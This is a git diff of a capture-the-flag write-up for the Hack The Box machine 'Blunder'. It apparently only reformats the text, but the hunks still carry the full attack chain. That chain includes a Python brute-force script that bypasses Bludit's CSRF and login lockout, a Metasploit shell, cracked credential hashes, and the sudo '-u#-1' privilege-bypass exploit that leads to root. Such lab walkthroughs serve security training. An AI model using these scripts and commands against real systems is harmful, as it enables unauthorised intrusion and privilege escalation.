@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -10,17 +10,17 @@ Short description to include any strange things to be dealt with
 
 #### Useful thing 1
 
-- description with generic example
+* description with generic example
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
 ### Nmap scan
 
-```
+```text
 zweilos@kali:~/htb/blunder$ nmap -p- -sC -sV -oN blunder 10.10.10.191
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-06 19:11 EDT
 Nmap scan report for 10.10.10.191
@@ -41,9 +41,9 @@ I started my enumeration with an nmap scan of `10.10.10.191`. The options I regu
 
 only port 80 open
 
-website of random facts.  
+website of random facts.
 
-```
+```text
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          10.10.10.191
@@ -113,40 +113,38 @@ website of random facts.
 + 1 host(s) tested
 ```
 
-`/admin/` has login.  `nikto` reveals a lot of security misconfigurations, though not many seem accessible without credentials.  `.gitignore` file possibly reveals directory structure.
+`/admin/` has login. `nikto` reveals a lot of security misconfigurations, though not many seem accessible without credentials. `.gitignore` file possibly reveals directory structure.
 
 `todo.txt` contains a potential username `fergus`
 
 The header of the file `config.log` contained the lines
 
-```
+```text
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Bludit</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="robots" content="noindex,nofollow">
+    <title>Bludit</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="robots" content="noindex,nofollow">
 
-	<!-- Favicon -->
-	<link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">
+    <!-- Favicon -->
+    <link rel="shortcut icon" type="image/x-icon" href="/bl-kernel/img/favicon.png?version=3.9.2">
 
-	<!-- CSS -->
-	<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
+    <!-- CSS -->
+    <link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
 <link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
 <link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">
 
-	<!-- Javascript -->
-	<script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
+    <!-- Javascript -->
+    <script src="http://10.10.10.191/bl-kernel/js/jquery.min.js?version=3.9.2"></script>
 <script src="http://10.10.10.191/bl-kernel/js/bootstrap.bundle.min.js?version=3.9.2"></script>
 
-	<!-- Plugins -->
-	</head>
+    <!-- Plugins -->
+    </head>
 ```
 
-"/bl-kernel/img/favicon.png?version=3.9.2" tells me the version of the service is 3.9.2 .  Searching for "bludit 3.9.2 exploit" leads to https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb which links to https://rastating.github.io/bludit-brute-force-mitigation-bypass/
-https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi_ssh.py
-https://github.com/bludit/bludit/issues/1081
+"/bl-kernel/img/favicon.png?version=3.9.2" tells me the version of the service is 3.9.2 . Searching for "bludit 3.9.2 exploit" leads to [https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb) which links to [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) [https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi\_ssh.py](https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi_ssh.py) [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)
 
 ```python
 #!/usr/bin/env python3
@@ -167,7 +165,7 @@ def worker(cred_queue, success_queue):
             return 
 
         try:
-            
+
                 session = requests.Session()
                 login_page = session.get(login_url)
                 csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
@@ -199,7 +197,7 @@ def worker(cred_queue, success_queue):
 #TODO: Fix this to clean up all threads and exit gracefully upon success
                         cleanup()
                         sys.exit()
-        
+
         except Exception:
         #Make this exception more verbose and useful
             e = sys.exc_info()[2]
@@ -215,7 +213,7 @@ def file_to_list(wList):
     #need to add check for encoding type on input file
     with open(wList, encoding='latin1') as wordList:
          templist = wordList.readlines()
-         
+
          for word in templist:
              passlist.append(word.strip())
 
@@ -262,20 +260,20 @@ if __name__ == '__main__':
         print('SUCCESSFUL LOGIN at {0}: {1}/{2}'.format(login_url, username, word))
 ```
 
-After writing my python brute-force program based off the one in the POC, I loaded it with rockyou.txt and let it run.  After it ran most of the day and didn't get any results, I decided to try another direction.  Since the site had plenty of text on it I decided to run `cewl` against it to build a custom wordlist.  I also included all of the pages I had enumerated with `dirbuster`.  
+After writing my python brute-force program based off the one in the POC, I loaded it with rockyou.txt and let it run. After it ran most of the day and didn't get any results, I decided to try another direction. Since the site had plenty of text on it I decided to run `cewl` against it to build a custom wordlist. I also included all of the pages I had enumerated with `dirbuster`.
 
-This worked much faster. It still had to go through a few thousand tries, but for my multithreaded script it didn't take long.  
+This worked much faster. It still had to go through a few thousand tries, but for my multithreaded script it didn't take long.
 
-![](Password_found.png)
+![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/Password_found.png)
 
 ## Initial Foothold
 
-Now that I had a working username and password to the `/admin/` page I was able to use the exploit I had found.  There was a nice and easy MetaSploit module so I fired up `msfconsole`.  
-https://github.com/rapid7/metasploit-framework/pull/12542/files
+Now that I had a working username and password to the `/admin/` page I was able to use the exploit I had found. There was a nice and easy MetaSploit module so I fired up `msfconsole`.  
+[https://github.com/rapid7/metasploit-framework/pull/12542/files](https://github.com/rapid7/metasploit-framework/pull/12542/files)
 
-```
+```text
 zweilos@kali:~/htb/blunder$ msfconsole
-                                                  
+
 
       .:okOOOkdc'           'cdkOOOko:.
     .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
@@ -395,7 +393,7 @@ meterpreter >
 
 ## Road to User
 
-```
+```text
 meterpreter > ls
 Listing: /var/www/bludit-3.9.2/bl-content/tmp
 =============================================
@@ -428,8 +426,10 @@ meterpreter > download users.php
 [*] Downloaded 1.24 KiB of 1.24 KiB (100.0%): users.php -> users.php
 [*] download   : users.php -> users.php
 ```
+
 users.php sounded like a likely place to find some information about...users.
-```
+
+```text
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
 {
     "admin": {
@@ -479,7 +479,7 @@ users.php sounded like a likely place to find some information about...users.
 
 It contained what looked like a hash and salt value for an `Administrator` user. I loaded the hash into the program `hash-identifier` to see what it was.
 
-```
+```text
 zweilos@kali:~/htb/blunder$ hash-identifier 
    #########################################################################
    #     __  __                     __           ______    _____           #
@@ -498,7 +498,7 @@ zweilos@kali:~/htb/blunder$ hash-identifier
 Possible Hashs:                                                                                         
 [+] SHA-1                                                                                               
 [+] MySQL5 - SHA-1(SHA-1($pass))                                                                        
-                                                                                                        
+
 Least Possible Hashs:                                                                                   
 [+] Tiger-160                                                                                           
 [+] Haval-160                                                                                           
@@ -530,8 +530,10 @@ Least Possible Hashs:
 ```
 
 ### Further enumeration
+
 after trying a few online hash-cracking sites and getting nowhere, I decided to keep looking before resorting to trying `hashcat` or `john`.
-```
+
+```text
 meterpreter > cd /var/www/bludit-3.10.0a
 meterpreter > ls
 Listing: /var/www/bludit-3.10.0a
@@ -597,14 +599,15 @@ Mode             Size  Type  Last modified              Name
 40755/rwxr-xr-x  4096  dir   2020-05-19 10:13:22 -0400  bludit-3.10.0a
 40775/rwxrwxr-x  4096  dir   2020-04-28 07:18:03 -0400  bludit-3.9.2
 40755/rwxr-xr-x  4096  dir   2019-11-28 04:34:02 -0500  html
-
 ```
-In the www folder I found a newer version of the Bludit CMS had been installed.  I hoped that I would find a newer version of the database, and was not disappointed.  
+
+In the www folder I found a newer version of the Bludit CMS had been installed. I hoped that I would find a newer version of the database, and was not disappointed.
 
 ### Finding user creds
 
-the users.php file contained a (un-salted!) hash for the user Hugo.
-```
+the users.php file contained a \(un-salted!\) hash for the user Hugo.
+
+```text
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
 { 
     "admin": {
@@ -627,8 +630,10 @@ the users.php file contained a (un-salted!) hash for the user Hugo.
         "gitlab": ""}
 }
 ```
+
 I checked the `/home` folder to see what users were on this machine and there was indeed one named `hugo`, and it had the `user.txt` flag in it!
-```
+
+```text
 meterpreter > ls
 Listing: /home
 ==============
@@ -637,17 +642,17 @@ Mode             Size  Type  Last modified              Name
 ----             ----  ----  -------------              ----
 40755/rwxr-xr-x  4096  dir   2020-05-26 04:29:29 -0400  hugo
 40755/rwxr-xr-x  4096  dir   2020-04-28 07:13:35 -0400  shaun
-
 ```
+
 The first hash cracking website I tried the hash on immediately revealed the password...
 
-![](password-cracked.png)
+![](https://github.com/zweilosec/htb-writeups/tree/dda4572d292886fc4ce08354b2cca9e61a905df3/linux-machines/easy/password-cracked.png)
 
 ### User.txt
 
-Since there were no remote connection ports open such as SSH, I needed to swith users in the shell I had.  I decided to switch to bash since I wasnt too sure what capabilites meterpreter might have and my commands seemed limited.  
+Since there were no remote connection ports open such as SSH, I needed to swith users in the shell I had. I decided to switch to bash since I wasnt too sure what capabilites meterpreter might have and my commands seemed limited.
 
-```
+```text
 meterpreter > shell
 Process 27233 created.
 Channel 16 created.
@@ -675,7 +680,7 @@ dcf1f1f3ecde4b372edf165518df8a77
 
 ### Enumeration as user `hugo`
 
-```
+```text
 hugo@blunder:/var/log$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -728,19 +733,21 @@ temp:x:1002:1002:,,,:/home/temp:/bin/bash
 
 three users can login besides root: `hugo`, `shaun`, and `temp`.
 
-`shaun` 
-```
+`shaun`
+
+```text
 hugo@blunder:/var/log$ id shaun
 uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
 ```
 
 `temp` only has access to temp group
-```
+
+```text
 hugo@blunder:/var/log$ groups temp
 temp : temp
 ```
 
-```
+```text
 hugo@blunder:~$ sudo -l
 sudo -l
 Password: Password120
@@ -753,9 +760,9 @@ User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 ```
 
-doing a search for `sudo (ALL, !root) /bin/bash` finds https://www.exploit-db.com/exploits/47502 which explains a privilege bypass method where you can get around the restriction on running commands as root (`!root`) by tricking sudo by giving the user `#-1`.  
+doing a search for `sudo (ALL, !root) /bin/bash` finds [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502) which explains a privilege bypass method where you can get around the restriction on running commands as root \(`!root`\) by tricking sudo by giving the user `#-1`.
 
-```
+```text
 # Exploit Title : sudo 1.8.27 - Security Bypass
 # Date : 2019-10-15
 # Original Author: Joe Vennix
@@ -835,14 +842,11 @@ print("Lets hope it works")
 os.system("sudo -u#-1 "+ binary)
 ```
 
-> Description :
-> Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
-> -u#-1 returns as 0 which is root's id
-> and /bin/bash is executed with root permission
-   
+> Description : Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv -u\#-1 returns as 0 which is root's id and /bin/bash is executed with root permission
+
 ### Getting a shell
 
-```
+```text
 hugo@blunder:/dev/shm$ sudo -u#0 /bin/bash
 Password: 
 Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
@@ -862,3 +866,4 @@ root@blunder:/dev/shm#
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
